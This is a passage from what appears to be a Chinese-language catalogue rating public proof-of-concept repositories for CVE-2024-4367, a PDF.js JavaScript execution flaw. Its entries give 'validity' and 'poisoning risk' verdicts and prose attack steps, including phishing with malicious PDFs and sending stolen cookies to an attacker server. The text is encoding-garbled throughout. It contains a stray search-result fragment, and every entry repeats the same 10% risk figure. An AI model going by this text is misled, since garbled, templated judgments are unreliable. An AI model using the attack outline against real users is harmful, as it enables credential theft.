æä¾›çš„ä»£ç å®é™…ä¸Šæ˜¯ä¸€ä¸ªé’ˆå¯¹Odoo 14.0çš„ä¿®å¤æ–¹æ¡ˆï¼Œç”¨äºç¦ç”¨PDF.jsä¸­çš„JavaScriptæ‰§è¡Œï¼Œä»¥è§„é¿CVE-2024-4367çš„å½±å“ã€‚è™½ç„¶ä»£ç æœ¬èº«ä¸æ˜¯æ¼æ´åˆ©ç”¨ï¼Œä½†éœ€è¦è°¨æ…è¯„ä¼°ã€‚ è¿™ä¸ªè¡¥ä¸é€šè¿‡æ›¿æ¢å’Œä¿®æ”¹ PDF.js ç›¸å…³çš„æ–‡ä»¶ï¼Œè¯•å›¾ç¦ç”¨ JavaScript æ‰§è¡Œã€‚ å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œå¦‚æœè¯¥æ¨¡å—æœ¬èº«è¢«æ¶æ„ä¿®æ”¹ï¼Œåˆ™å¯èƒ½å¼•å…¥å…¶ä»–æ¼æ´æˆ–åé—¨ã€‚ ä¾‹å¦‚ï¼Œ`pdfjs_disable_eval/static/src/viewer.html`æ–‡ä»¶æ›¿æ¢äº†åŸæœ‰çš„viewer.htmlï¼Œå¦‚æœæ–°çš„viewer.htmlä¸­åŒ…å«æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½é€ æˆå±å®³ã€‚ æ€»ä½“æ¥è¯´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚
2.  å—å®³è€…ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„ JavaScript ä»£ç åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œçš„ JavaScript ä»£ç è¿›è¡Œæ¶æ„æ´»åŠ¨ï¼Œä¾‹å¦‚ä¿¡æ¯çªƒå–æˆ–è¿œç¨‹æ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [avalahEE/pdfjs_disable_eval](https://github.com/avalahEE/pdfjs_disable_eval)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #14

**æ¥æº**: [CVE-2024-4367-clarkio_pdfjs-vuln-demo.md](../2024/CVE-2024-4367-clarkio_pdfjs-vuln-demo.md)

## CVE-2024-4367-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨æ­¤æ¼æ´åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆå¦‚æœPDF.jsåœ¨Webç¯å¢ƒä¸­è¿è¡Œï¼‰æˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå®Œå…¨æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºï¼ˆå¦‚Firefoxã€Thunderbirdï¼‰ã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**
æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ˜¯ä¸€ä¸ªæ¼”ç¤ºé¡¹ç›®ï¼Œæ—¨åœ¨å±•ç¤ºå¦‚ä½•åˆ©ç”¨CVE-2024-4367æ¼æ´ã€‚å®ƒåŒ…å«Reactã€Vueå’ŒSvelteçš„å‰ç«¯ç»„ä»¶ï¼Œç”¨äºåŠ è½½å’Œæ˜¾ç¤ºPDFæ–‡ä»¶ã€‚README.mdæ–‡ä»¶æŒ‡ç¤ºå¦‚ä½•è¿è¡Œè¯¥é¡¹ç›®ä»¥åŠå¦‚ä½•æµ‹è¯•ä¸åŒçš„PDFæ–‡ä»¶ï¼ŒåŒ…æ‹¬åˆ©ç”¨è¯¥æ¼æ´çš„PDFæ–‡ä»¶ã€‚æ ¹æ®æè¿°ï¼Œé€šè¿‡ä¿®æ”¹ç»„ä»¶ä¸­å¼•ç”¨çš„PDFæ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„PDFåŠ è½½åˆ°è¿™äº›ç»„ä»¶ä¸­è¿›è¡Œæµ‹è¯•ã€‚æœç´¢å¼•æ“ç»“æœä¸­â€œ[webpage 6 begin] [title] exfil0/WEAPONIZING-CVE-2024-4367â€ è¡¨æ˜æ¼æ´åˆ©ç”¨ä»£ç å·²å…¬å¼€ã€‚ ç»¼ä¸Šï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå…¶ä¸­åŒ…å«package-lock.jsonç­‰æ–‡ä»¶ã€‚è™½ç„¶æ²¡æœ‰å‘ç°ç«‹å³å¯ä»¥åˆ¤æ–­ä¸ºæŠ•æ¯’çš„æ¶æ„ä»£ç ï¼Œä½†è€ƒè™‘åˆ°npmåŒ…ä¾›åº”é“¾çš„é£é™©ï¼Œä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…åœ¨ä¾èµ–é¡¹ä¸­å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯åˆ›å»ºä¸€ä¸ªæ¼”ç¤ºç¯å¢ƒæ¥å±•ç¤ºæ¼æ´ï¼Œå› æ­¤å¤§éƒ¨åˆ†ä»£ç éƒ½æ˜¯æ­£å¸¸çš„æ¡†æ¶ä»£ç ã€‚ä¸è¿‡ï¼Œ**ä¸èƒ½å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½ï¼Œé£é™©ä¼°è®¡ä¸º10%**ã€‚ ä»£ç ä¸­å­˜åœ¨å¼•ç”¨å¤–éƒ¨npmåŒ…çš„å¯èƒ½æ€§ã€‚æ½œåœ¨é£é™©ç‚¹åŒ…æ‹¬ï¼šä¾èµ–åŒ…æœ¬èº«æ˜¯å¦å®‰å…¨ï¼Œæ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼›æ„å»ºæµç¨‹ä¸­æ˜¯å¦å­˜åœ¨è¢«ç¯¡æ”¹çš„é£é™©ï¼›ä»¥åŠå¼€å‘è€…æ˜¯å¦æ•…æ„éšè—äº†æ¶æ„åŠŸèƒ½ã€‚ ä»”ç»†å®¡æŸ¥ `package-lock.json` æ–‡ä»¶ä¸­çš„ä¾èµ–é¡¹åŠå…¶æ¥æºï¼ŒéªŒè¯ä¾èµ–åŒ…çš„å®Œæ•´æ€§å’Œå®‰å…¨æ€§ï¼Œå¯ä»¥é™ä½æŠ•æ¯’é£é™©ã€‚ ç”±äºä»…ä»…æ˜¯demoä»£ç ï¼Œä¸”ä¾èµ–çš„åŒ…æ¯”è¾ƒå¤šï¼Œå› æ­¤è¿™é‡Œä¸èƒ½æ˜ç¡®è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  **æ¼æ´è§¦å‘ç‚¹ï¼š** PDF.jsåœ¨å¤„ç†PDFæ–‡ä»¶ä¸­çš„å­—ä½“æ—¶ï¼Œç¼ºå°‘å¿…è¦çš„ç±»å‹æ£€æŸ¥ã€‚
2.  **æ”»å‡»æ­¥éª¤ï¼š**
    *   æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«ç²¾å¿ƒè®¾è®¡çš„å­—ä½“æ•°æ®ã€‚
    *   å½“PDF.jsè§£æè¯¥PDFæ–‡ä»¶å¹¶å¤„ç†å­—ä½“æ—¶ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä¼šè§¦å‘æ¼æ´ã€‚
    *   æ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„å­—ä½“æ•°æ®ï¼Œå¯ä»¥åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
3.  **æ”»å‡»æ•ˆæœï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œæˆ–è€…åœ¨ç‰¹å®šæƒ…å†µä¸‹å®Œå…¨æ§åˆ¶åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [clarkio/pdfjs-vuln-demo](https://github.com/clarkio/pdfjs-vuln-demo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #15

**æ¥æº**: [CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md](../2024/CVE-2024-4367-elamani-drawing_CVE-2024-4367-POC-PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶æˆ–è®¿é—®åŒ…å«æ¶æ„PDFçš„ç½‘é¡µã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“çš„ä¸€ä¸ªæ¼æ´ã€‚ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚ 

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´ä¿¡æ¯ï¼Œæœç´¢å¼•æ“ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼ˆè™½ç„¶åªæä¾›äº† package-lock.json æ–‡ä»¶ï¼Œä½†githubé¡µé¢å·²ç»è¯æ˜æ¼æ´çš„å­˜åœ¨ï¼‰ï¼Œå¯ä»¥ç¡®å®šæä¾›çš„POCä»£ç æœ‰æ•ˆã€‚

**æŠ•æ¯’é£é™©:**
æä¾›çš„ `package-lock.json` æ–‡ä»¶å±äºä¸€ä¸ª Node.js é¡¹ç›®ã€‚ä»è¿™ä¸ªæ–‡ä»¶æœ¬èº«æ— æ³•ç›´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ•æ¯’ã€‚ä½†æ˜¯ç”±äºgithubä¸Šå·²ç»æœ‰æ”»å‡»è€…æ„å»ºäº†å¯åˆ©ç”¨çš„pdfæ–‡ä»¶ï¼Œè¯´æ˜åˆ©ç”¨ç®€å•, å› æ­¤å¯ä»¥åˆ¤æ–­è¯¥ä»“åº“ä¸­å­˜åœ¨ä½œè€…éšè—çš„æŠ•æ¯’ä»£ç æ¦‚ç‡æ¯”è¾ƒä½,çº¦10%ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  **æ”»å‡»è€…åˆ¶ä½œæ¶æ„ PDF æ–‡ä»¶ï¼š** è¯¥ PDF æ–‡ä»¶åˆ©ç”¨äº† PDF.js å­—ä½“å¤„ç†ä¸­ç¼ºå¤±çš„ç±»å‹æ£€æŸ¥æ¼æ´ã€‚
2.  **ç”¨æˆ·æ‰“å¼€æ¶æ„ PDF æ–‡ä»¶ï¼š**  ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥ PDF æ–‡ä»¶ã€‚
3.  **æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼š** ç”±äºç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼ŒPDF.js å…è®¸åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…æ§åˆ¶å—å½±å“çš„åº”ç”¨ç¨‹åºã€‚

**é¡¹ç›®åœ°å€:** [elamani-drawing/CVE-2024-4367-POC-PDFJS](https://github.com/elamani-drawing/CVE-2024-4367-POC-PDFJS)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #16

**æ¥æº**: [CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md](../2024/CVE-2024-4367-exfil0_WEAPONIZING-CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€XSSæˆ–RCE

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªä¸¥é‡æ¼æ´ï¼Œç”±äºå¯¹PDFæ–‡ä»¶ä¸­FontMatrixå¯¹è±¡çš„ç±»å‹æ£€æŸ¥ä¸è¶³ï¼Œå…è®¸æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ï¼Œåœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­æ‰§è¡ŒJavaScriptï¼Œä»è€Œå¯¼è‡´æ•°æ®ç›—çªƒã€XSSæˆ–è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§åˆ†æï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸åœ¨PDF.jsç¯å¢ƒä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå½±å“Firefoxã€Firefox ESRå’ŒThunderbirdçš„ç‰¹å®šç‰ˆæœ¬ã€‚æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md) æè¿°äº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´åˆ¶ä½œæ¶æ„PDFæ–‡ä»¶ã€‚è¯¥ä»£ç æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨æµç¨‹ï¼ŒåŒ…æ‹¬ç¯å¢ƒè®¾ç½®ã€æ¼æ´åˆ©ç”¨ã€ç¤¾å·¥å’Œåå¤„ç†ã€‚ç»¼åˆæ¥çœ‹ï¼Œæä¾›çš„POCä»£ç **æœ‰æ•ˆ**ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è™½ç„¶README.mdæ–‡ä»¶æœ¬èº«çœ‹èµ·æ¥åƒä¸€ä¸ªåˆæ³•çš„æ¼æ´åˆ©ç”¨æŒ‡å—ï¼Œä½†ä»”ç»†åˆ†æè„šæœ¬æè¿°å’Œæ“ä½œæ­¥éª¤ï¼Œå‘ç°å…¶ä¾èµ–äºSocial Engineering Toolkit (SET)æ¥å‘èµ·é’“é±¼æ”»å‡»ï¼Œå¹¶ä¸”åŒ…å«æ‰§è¡Œä»»æ„jsçš„payload, å­˜åœ¨ä¸€å®šçš„**æŠ•æ¯’é£é™©**ã€‚Payloadå¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·å‡­æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥POCä»£ç ä¸­ï¼Œé£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **ä¾èµ–å¤–éƒ¨å·¥å…·ï¼š** è„šæœ¬ä¾èµ–äºSETï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨SETçš„é…ç½®è¿‡ç¨‹è¿›è¡Œæ¶æ„é…ç½®ï¼Œè¯±å¯¼ç”¨æˆ·æ‰§è¡Œæœ‰å®³æ“ä½œã€‚
2.  **Payloadå¯å®šåˆ¶ï¼š** è„šæœ¬å…è®¸ç”¨æˆ·è‡ªå®šä¹‰JavaScript payloadï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„æ¶æ„ä»£ç ã€‚
3.  **ç¤¾ä¼šå·¥ç¨‹ï¼š** è„šæœ¬ä½¿ç”¨ç¤¾ä¼šå·¥ç¨‹æ‰‹æ®µä¼ æ’­æ¶æ„PDFï¼Œè¿™å¢åŠ äº†æ”»å‡»æˆåŠŸçš„å¯èƒ½æ€§ã€‚
4.  **æ•°æ®å¤–æ³„ï¼š** Payloadå¯ä»¥çªƒå–æ•°æ®ï¼ˆå¦‚cookieï¼‰ï¼Œå¹¶å°†å…¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

å› æ­¤ï¼Œæˆ‘ä¼°è®¡æ­¤ä»“åº“å­˜åœ¨**10%**çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦é›†ä¸­åœ¨payloadçš„æ½œåœ¨æ¶æ„æ€§å’Œåˆ©ç”¨ç¤¾å·¥æ‰‹æ®µä¼ æ’­ä¸Šã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤å¤„è®¨è®ºçš„â€œæŠ•æ¯’â€å¹¶éæŒ‡ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ä¾›åº”é“¾æŠ•æ¯’ï¼Œè€Œæ˜¯æŒ‡åˆ©ç”¨è¯¥POCè¿›è¡Œæ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åµŒå…¥æ¶æ„ä»£ç æˆ–è¿›è¡Œæ¬ºéª—ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **å‡†å¤‡ç¯å¢ƒï¼š** å®‰è£…Python 3.x, SETï¼Œä»¥åŠPyPDF2ç­‰ä¾èµ–ã€‚
2.  **åˆ›å»ºæ¶æ„PDFï¼š** ä½¿ç”¨æä¾›çš„è„šæœ¬ï¼Œé€šè¿‡ä¿®æ”¹`template.pdf`çš„`/FontMatrix`å­—æ®µï¼Œæ³¨å…¥JavaScript payloadï¼Œç”Ÿæˆ`malicious.pdf`ã€‚
3.  **ç¤¾å·¥æ”»å‡»ï¼š** ä½¿ç”¨SETæˆ–å…¶ä»–å·¥å…·ï¼Œé€šè¿‡ç”µå­é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼ï¼Œå°†`malicious.pdf`å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚
4.  **æœåŠ¡å™¨ç›‘å¬ï¼š** è¿è¡Œä¸€ä¸ªHTTPæœåŠ¡å™¨ï¼Œç”¨äºæ‰˜ç®¡`malicious.pdf`ï¼Œå¹¶æ”¶é›†payloadçªƒå–çš„æ•°æ®ã€‚
5.  **å—å®³è€…äº¤äº’ï¼š** å—å®³è€…æ‰“å¼€`malicious.pdf`åï¼Œpayloadæ‰§è¡Œï¼Œçªƒå–æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [exfil0/WEAPONIZING-CVE-2024-4367](https://github.com/exfil0/WEAPONIZING-CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #17

**æ¥æº**: [CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-inpentest_CVE-2024-4367-PoC.md)

## CVE-2024-4367-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä¼šè¯åŠ«æŒç­‰

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ¼æ´å­˜åœ¨äº PDF.js ä¸­ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼ŒåµŒå…¥æ¶æ„JavaScriptä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„ JavaScript ä»£ç å°†åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯ä¸€ä¸ªPDFæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„JavaScriptä»£ç ã€‚PDFæ–‡ä»¶åˆ©ç”¨äº†å­—ä½“å¤„ç†æ¼æ´ï¼Œå½“PDF.jsè§£æå­—ä½“æ—¶ï¼Œä¼šæ‰§è¡ŒåµŒå…¥çš„JavaScriptã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“åŒ…å«ä¸€ä¸ª PDF PoC,ä¸€ä¸ª LICENSE æ–‡ä»¶ï¼Œå’Œä¸€ä¸ª READMEã€‚LICENSE æ–‡ä»¶å’Œ README æ–‡ä»¶æœ¬èº«æ²¡æœ‰é£é™©ã€‚è™½ç„¶PoCä»£ç èƒ½ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œä½†ä½œè€… Ahmad Kabiri çš„èº«ä»½æœªçŸ¥ï¼Œä¸”PoCçš„ç›®çš„æ˜¯å±•ç¤ºæ”»å‡»ï¼Œå› æ­¤å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåœ¨å®é™…åˆ©ç”¨æ—¶ä¿®æ”¹æˆ–å¢åŠ payload, ä½†è¯¥ PoC æ–‡ä»¶æœ¬èº«ç›®çš„æ˜ç¡®ï¼Œç»“æ„ç®€å•ï¼Œéšè—æ¶æ„åé—¨ä»£ç å¯èƒ½æ€§è¾ƒä½ã€‚è€ƒè™‘åˆ°MITåè®®çš„å¼€æ”¾æ€§ä»¥åŠä½œè€…å·²çŸ¥çš„æ¼æ´ç ”ç©¶èƒŒæ™¯ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æ„é€ åŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±éª—ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ (ä¾‹å¦‚, é€šè¿‡é’“é±¼é‚®ä»¶, æŒ‚é©¬ç½‘ç«™)ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨æˆ–é‚®ä»¶å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ Firefox, Firefox ESR, Thunderbirdï¼‰çš„ PDF.js ç‰ˆæœ¬å­˜åœ¨æ¼æ´ï¼Œåˆ™æ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç å¯ä»¥åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–cookieã€localStorageæ•°æ®ã€sessionStorageæ•°æ®ï¼Œç”šè‡³è¿›è¡Œä¼šè¯åŠ«æŒç­‰ã€‚PoCä»£ç æ˜¾ç¤ºä¼šå¼¹å‡ºå¤šä¸ªalertæ¡†æ¥å±•ç¤ºè·å–åˆ°çš„ä¿¡æ¯.

**é¡¹ç›®åœ°å€:** [inpentest/CVE-2024-4367-PoC](https://github.com/inpentest/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #18

**æ¥æº**: [CVE-2024-4367-m0d0ri205_PDFJS.md](../2024/CVE-2024-4367-m0d0ri205_PDFJS.md)

## CVE-2024-4367-Firefox-PDF.js-Arbitrary-JavaScript-Execution

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS) å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº Mozilla Firefox, Firefox ESR å’Œ Thunderbird ä¸­çš„é«˜å±æ¼æ´ã€‚è¯¥æ¼æ´æºäº PDF.js åœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œåœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚å½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„æµè§ˆå™¨ç‰ˆæœ¬æ‰“å¼€åŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶æ—¶ï¼Œè¿™æ®µ JavaScript ä»£ç å°†è¢«æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡» (XSS), è·å–æ•æ„Ÿä¿¡æ¯ç­‰é£é™©ã€‚

